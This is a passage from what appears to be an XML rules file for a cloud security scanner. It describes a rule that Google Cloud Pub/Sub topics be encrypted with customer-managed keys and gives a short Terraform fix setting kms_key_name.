<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Customer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.</p>
<p>We recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical Pub/Sub Topics. This helps protect the Google-generated keys used to encrypt and decrypt your data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<ul>
<li><strong>Resource</strong>: google_pubsub_topic</li>
<li><strong>Arguments</strong>: kms_key_name</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_pubsub_topic" "pass" {
  name         = "example-topic"
  kms_key_name = google_kms_crypto_key.crypto_key.id
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-pubsub-topics-are-encrypted-with-customer-supplied-encryption-keys-csek' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-pubsub-topics-are-encrypted-with-customer-supplied-encryption-keys-csek</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-pubsub-topics-are-encrypted-with-customer-supplied-encryption-keys-csek' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
</rules>